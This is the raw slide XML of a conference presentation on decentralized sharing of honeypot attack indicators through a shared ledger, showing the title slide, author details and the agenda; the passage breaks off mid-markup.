              <a:defRPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>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
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4754880"/>
            <a:ext cx="5486400" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hub-less Cross-Honeypot Threat Intelligence  ·  ICOIICS 2026</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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138160" y="475488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3.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3.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slideLayout" Target="../slideLayouts/slideLayout3.xml"/><Relationship Id="rId7"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slideLayout" Target="../slideLayouts/slideLayout3.xm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conference"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="777240"/>
            <a:ext cx="4480560" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ICOIICS 2026  ·  PAPER ICOIICS_245</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="title"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1143000"/>
            <a:ext cx="4572000" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hub-less Cross-Honeypot</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Threat Intelligence</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="subtitle"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2286000"/>
            <a:ext cx="4572000" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Federated IOC Corroboration on a Shared Ledger</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="authors"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3200400"/>
            <a:ext cx="4572000" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Suhas Reddy Annem  ·  Sisir Reddy Nellore  ·  Radhika G</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dept. of CSE, Amrita School of Computing, Coimbatore</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Amrita Vishwa Vidyapeetham, India</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="hero panel"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5257800" y="777240"/>
            <a:ext cx="3337560" cy="3429000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="hub-less diagram" descr="Three honeypots write tags to one shared ledger with no owner; a fourth node joins later and reads the same history.">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5394960" y="960120"/>
            <a:ext cx="3063240" cy="2294685"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="hero caption"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5440680" y="3383280"/>
            <a:ext cx="2971800" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Honeypots share what they see through one append-only ledger. No central server.</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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OVERVIEW</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Today's talk</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="agenda 1 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1453896"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="agenda 1 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="1417320"/>
            <a:ext cx="2651760" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Background</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="agenda 1 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3931920" y="1417320"/>
            <a:ext cx="4663440" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Honeypots, attack indicators, and why sharing them matters</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="agenda rule 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1984248"/>
            <a:ext cx="8046720" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="agenda 2 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2075688"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="agenda 2 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="2039112"/>
            <a:ext cx="2651760" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The problem</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="agenda 2 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3931920" y="2039112"/>
            <a:ext cx="4663440" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Why one central hub is a risky way to share</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="agenda rule 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2606040"/>
            <a:ext cx="8046720" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="agenda 3 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2697480"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="agenda 3 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="2660904"/>
            <a:ext cx="2651760" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prior work and our edge</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="agenda 3 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3931920" y="2660904"/>
            <a:ext cx="4663440" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Where earlier designs stop, and where we go further</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="agenda rule 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3227832"/>
            <a:ext cx="8046720" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="agenda 4 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3319272"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="agenda 4 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="3282696"/>
            <a:ext cx="2651760" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Our design</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="agenda 4 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3931920" y="3282696"/>
            <a:ext cx="4663440" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Fingerprints on a shared ledger, plus commit–reveal</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="agenda rule 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3849624"/>
            <a:ext cx="8046720" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="agenda 5 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3941064"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="agenda 5 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="3904488"/>
            <a:ext cx="2651760" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Results</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="agenda 5 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3931920" y="3904488"/>
            <a:ext cx="4663440" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Eight experiments on a live blockchain</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
